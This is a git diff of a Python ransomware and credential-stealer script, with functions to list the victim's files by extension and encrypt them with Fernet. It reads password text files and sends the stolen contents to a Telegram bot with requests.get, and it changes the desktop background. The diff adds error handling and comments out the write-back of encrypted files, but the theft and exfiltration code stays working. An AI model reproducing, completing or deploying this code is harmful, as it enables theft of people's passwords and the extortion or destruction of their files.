@@ -35,24 +35,33 @@ FILE_EXTENSIONS: List[str] = [
     "jpg",
     "jpeg",
     "pdf",
-    "docx",
-    "xlsx",
+    # "docx",
+    # "xlsx",
     "csv"
     ]
 
 def openFile(path_to_file: str) -> bytes:
-    with open(path_to_file,"rb") as file_to_open:
-        result: bytes = file_to_open.read()
-    return result
-
-def grabPasswords(path_to_file: str) -> str:
-    with open(path_to_file,"r") as file_to_open:
-        result: str = file_to_open.read()
-    return result
+    try:
+        with open(path_to_file,"rb") as file_to_open:
+            result: bytes = file_to_open.read()
+        return result
+    except:
+        print("File format not supported")
 
 def saveToFile(path_to_file: str, data: bytes) -> None:
-    with open(path_to_file, "wb") as file_to_save:
-        file_to_save.write(data)
+    try:
+        with open(path_to_file, "wb") as file_to_save:
+            file_to_save.write(data)
+    except:
+        print("File format not supported")
+
+def grabPasswords(path_to_file: str) -> str:
+    if path_to_file.endswith(".txt"):
+        with open(path_to_file,"r") as file_to_open:
+            result: str = file_to_open.read()
+        return result
+    else:
+        return None
 
 def generateKey() -> str:
     temp_key: Any = Fernet.generate_key()
@@ -75,12 +84,15 @@ def setBackgroundImage(path_to_url: str, path_to_local: str, val_set: int, val_i
     )
 
 def sendToBot(path_to_bot: str, message: str) -> None:
-    message_as_string: str = (
-       message
-        .replace(" ","_")
-    )
-    message_to_bot: str = path_to_bot + message_as_string
-    requests.get(message_to_bot).json()
+    try:
+        message_as_string: str = (
+        message
+            .replace(" ","_")
+        )
+        message_to_bot: str = path_to_bot + message_as_string
+        requests.get(message_to_bot).json()
+    except:
+        print("File format not supported")
 
 def listFiles(path_to_folders: str, extensions: List[str]) -> List[str]:
     result: List[str] = []
@@ -94,10 +106,10 @@ def listFiles(path_to_folders: str, extensions: List[str]) -> List[str]:
 
 def encryptFile(path_to_file: str, encryption_key: str) -> None:
     fernet = Fernet(encryption_key)
-    file_as_string: bytes = openFile(path_to_file)
     try:
-        file_encrypted: Any = fernet.encrypt(file_as_string)
-        saveToFile(path_to_file,file_encrypted)
+        file_as_bytes: bytes = openFile(path_to_file)
+        file_encrypted: Any = fernet.encrypt(file_as_bytes)
+        # saveToFile(path_to_file,file_encrypted)
     except:
         pass
 
@@ -112,7 +124,6 @@ def runAll() -> None:
             sendToBot(TELEGRAM_CHANNEL,stolen_passwords)
             encryptFile(file_to_encrypt, unique_key)
         else:
-            print(file_to_encrypt)
             encryptFile(file_to_encrypt, unique_key)
     setBackgroundImage(
         PATH_TO_BACKGROUND_IMAGE_URL,
